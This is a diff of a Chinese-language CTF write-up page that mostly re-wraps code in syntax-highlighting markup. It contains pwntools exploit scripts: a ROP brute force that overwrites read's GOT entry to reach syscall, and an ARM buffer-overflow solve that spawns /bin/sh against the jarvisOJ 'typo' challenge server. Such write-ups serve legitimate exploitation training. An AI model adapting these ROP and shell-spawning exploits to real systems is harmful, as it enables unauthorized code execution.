 <li>利用工具来实现攻击，从而获取 shell。这种方式比较简单，但我们还是应该充分理解背后的原理，不能只是会使用工具。</li>
 </ol>
 <h4 id="手工伪造"><a href="#手工伪造" class="headerlink" title="手工伪造"></a>手工伪造</h4><p>这题我们不考虑有 libc 的情况。通过分析，我们可以发现程序有一个很明显的栈溢出漏洞，缓冲区到返回地址间的偏移为 112。</p>
-<pre class="line-numbers language-asm"><code class="language-asm">gef➤  pattern create 200
+<pre class="line-numbers language-assembly"><code class="language-assembly">gef➤  pattern create 200
 [+] Generating a pattern of 200 bytes
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 [+] Saved as '$_gef0'
@@ -4082,34 +4103,35 @@ io<span class="token punctuation">.</span>send<span class="token punctuation">(<
 io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="方法-2-标准-ROP"><a href="#方法-2-标准-ROP" class="headerlink" title="方法 2 - 标准 ROP"></a>方法 2 - 标准 ROP</h3><p>这个方法比较取巧，考虑到 read 函数很短，而且最后会调用系统调用，因此在 libc 的实现中会使用 syscall 指令，而同时我们可以修改 read 的 got 表，那如果我们把 <a href="mailto:read@got.plt">read@got.plt</a> 修改为 syscall 的地址，同时布置好相关的参数，即可执行系统调用。这里我们控制 ROP 执行<code>execve("/bin/sh",NULL,NULL)</code>。</p>
 <p>首先，我们需要爆破来寻找 syscall 具体的地址，我们可以考虑调用 write 函数来看是否真正执行了 syscall指令</p>
-<pre><code>def bruteforce():
-    rop_addr = elf.bss()
-    for i in range(0, 256):
-        io = process("./readable")
-        # modify read's got
-        payload = csu_gadget(0, 1, elf.got["read"], 1, elf.got["read"], 0)
-        # jump to read again
-        # try to write ELF Header to stdout
-        payload += csu_gadget(0, 1, elf.got["read"], 4, 0x400000, 1)
-        # gdb.attach(io)
-        # pause()
-        for j in range(0, len(payload), 16):
-            tmp = read16bytes(rop_addr+j, payload[j:j+16])
-            io.send(tmp)
-        # jump to the rop
-        payload = 'a'*16
-        payload += p64(rop_addr-8)
-        payload += p64(0x400520)  # leave ret
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">bruteforce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    rop_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./readable"</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># modify read's got</span>
+        payload <span class="token operator">=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># jump to read again</span>
+        <span class="token comment" spellcheck="true"># try to write ELF Header to stdout</span>
+        payload <span class="token operator">+=</span> csu_gadget<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x400000</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># gdb.attach(io)</span>
+        <span class="token comment" spellcheck="true"># pause()</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            tmp <span class="token operator">=</span> read16bytes<span class="token punctuation">(</span>rop_addr<span class="token operator">+</span>j<span class="token punctuation">,</span> payload<span class="token punctuation">[</span>j<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
+        <span class="token comment" spellcheck="true"># jump to the rop</span>
+        payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">16</span>
+        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rop_addr<span class="token number">-8</span><span class="token punctuation">)</span>
+        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400520</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># leave ret</span>
 
-        io.send(payload)
-        io.send(p8(i))
-        try:
-            data = io.recv(timeout=0.5)
-            if data == "\x7FELF":
-                print(hex(i), data)
-        except Exception as e:
-            pass
-        io.close()</code></pre><p>即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下</p>
+        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p8<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            data <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
+            <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token string">"\x7FELF"</span><span class="token punctuation">:</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>即我们控制程序输出 ELF 文件的头，如果输出了，那就说明成功了。此外，这里我们使用了read 函数的返回值来控制 rax 寄存器的值，以便于控制具体想要执行哪个系统调用。运行结果如下</p>
 <pre class="line-numbers language-bash"><code class="language-bash">❯ python exp.py
 <span class="token punctuation">(</span><span class="token string">'0x8f'</span>, <span class="token string">'\x7fELF'</span><span class="token punctuation">)</span>
 <span class="token punctuation">(</span><span class="token string">'0xc2'</span>, <span class="token string">'\x7fELF'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
@@ -5713,50 +5735,51 @@ pwndbg> cyclic -l 0x62616164
 <p>或者可以通过搜索 /bin/sh 字符串来寻找 system 函数</p>
 </blockquote>
 <h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>所有的条件都有了，构造 system(“/bin/sh”) 即可</p>
-<pre><code>jarvisOJ_typo [master●●] cat solve.py 
-#!/usr/bin/env python
-# -*- coding: utf-8 -*-
+<pre class="line-numbers language-python"><code class="language-python">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> cat solve<span class="token punctuation">.</span>py 
+<span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
 
-from pwn import *
-import sys
-import pdb
-#  context.log_level = "debug"
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> pdb
+<span class="token comment" spellcheck="true">#  context.log_level = "debug"</span>
 
-#  for i in range(100, 150)[::-1]:
-for i in range(112, 123):
-    if sys.argv[1] == "l":
-        io = process("./typo", timeout = 2)
-    elif sys.argv[1] == "d":
-        io = process(["qemu-arm", "-g", "1234", "./typo"])
-    else:
-        io = remote("pwn2.jarvisoj.com", 9888, timeout = 2)
+<span class="token comment" spellcheck="true">#  for i in range(100, 150)[::-1]:</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"l"</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"d"</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-arm"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./typo"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn2.jarvisoj.com"</span><span class="token punctuation">,</span> <span class="token number">9888</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span>
 
-    io.sendafter("quit\n", "\n")
-    io.recvline()
+    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-    '''
+    <span class="token triple-quoted-string string">'''
     jarvisOJ_typo [master●●] ROPgadget --binary ./typo --string /bin/sh
     Strings information
     ============================================================
     0x0006c384 : /bin/sh
     jarvisOJ_typo [master●●] ROPgadget --binary ./typo --only "pop|ret" | grep r0
     0x00020904 : pop {r0, r4, pc}
-    '''
+    '''</span>
 
-    payload = 'a' * i + p32(0x20904) + p32(0x6c384) * 2 + p32(0x110B4)
-    success(i)
-    io.sendlineafter("\n", payload)
+    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> i <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110B4</span><span class="token punctuation">)</span>
+    success<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
 
-    #  pause()
-    try:
-        #  pdb.set_trace()
-        io.sendline("echo aaaa")
-        io.recvuntil("aaaa", timeout = 1)
-    except EOFError:
-        io.close()
-        continue
-    else:
-        io.interactive()</code></pre><h2 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
+    <span class="token comment" spellcheck="true">#  pause()</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true">#  pdb.set_trace()</span>
+        io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo aaaa"</span><span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"aaaa"</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> EOFError<span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h2><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
 <pre class="line-numbers language-bash"><code class="language-bash">Shanghai2018_baby_arm <span class="token punctuation">[</span>master<span class="token punctuation">]</span> check ./pwn
 + <span class="token function">file</span> ./pwn
 ./pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="token keyword">for</span> GNU/Linux 3.7.0, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
@@ -6663,7 +6686,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1257.5k</span>&nbsp;字
+                class="white-color">1222.3k</span>&nbsp;字
             
             
             
